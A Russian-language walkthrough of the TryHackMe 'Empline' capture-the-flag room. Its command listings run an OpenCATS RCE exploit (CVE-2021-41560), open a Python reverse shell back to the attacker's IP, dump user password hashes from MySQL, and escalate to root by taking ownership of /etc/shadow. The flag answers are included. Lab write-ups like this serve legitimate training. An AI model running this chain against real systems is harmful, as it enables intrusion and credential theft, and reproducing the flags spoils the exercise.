[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Empline](https://tryhackme.com/r/room/empline) 

Всего 3 задания:
## Задание 1
Убедитесь, что вы подключены к  сети TryHackMe . Если вы не знаете, как это сделать, сначала пройдите комнату OpenVPN.
### Ответьте на вопросы ниже
Разверните машину!
```commandline
Ответ не нужен
```

## Задание 2
Соберите все флаги, чтобы завершить комнату.
### Ответьте на вопросы ниже
Пользователь.txt
```commandline
nmap -sSCV -T4 <IP>
echo "<IP> empline.thm job.empline.thm" >> /etc/hosts
gobuster dir -w /usr/share/wordlists/dirb/common.txt -v -k -u http://job.empline.thm -x php,js,conf,bak,txt,old | grep “Found”
# http://job.empline.thm/careers
# OpenCATS <= 0.9.4 RCE (CVE-2021-41560)
./CVE-2021-41560.sh http://job.empline.thm/
whoami
export RHOST="<my_own_IP>";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
cat user.txt
```
```commandline
91cb89c70aa2e5ce0e0116dab099078e
```
Корень.txt
```commandline
cat config.php
mysql -h <IP> -u james -p
show databases;
use opencats;
show tables;  
select * from user;
# admin          | b67b5ecc5d8902ba59c65596e4c053ec |
# cats@rootadmin | cantlogin                        |
# george         | 86d0dfda99dbebc424eb4407947356ac |
# james          | e53fbdb31890ff3bc129db0e27c473c9

# md5 hash
ssh george@<IP>
ls -l /etc/shadow                                                                                                                           
/usr/local/bin/ruby -e "require 'fileutils'" -e "FileUtils.chown('george','george','/etc/shadow')"   
ls -l /etc/shadow                                                                                                                           
openssl passwd -6 -salt abc password                                                                                                        
vim /etc/shadow                                                                                                                             
cat /etc/shadow
```
```commandline
74fea7cd0556e9c6f22e6f54bc68f5d5
```

## Задание 3
Во-первых, я хотел бы поблагодарить вас за игру в эту машину. Надеюсь, вам было весело!

И еще, спасибо за отзыв о моей первой коробке ( Mustacchio ).

Завершение, большое спасибо Touklwez .

Хороший взлом!

### Ответьте на вопросы ниже
Спасибо!
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)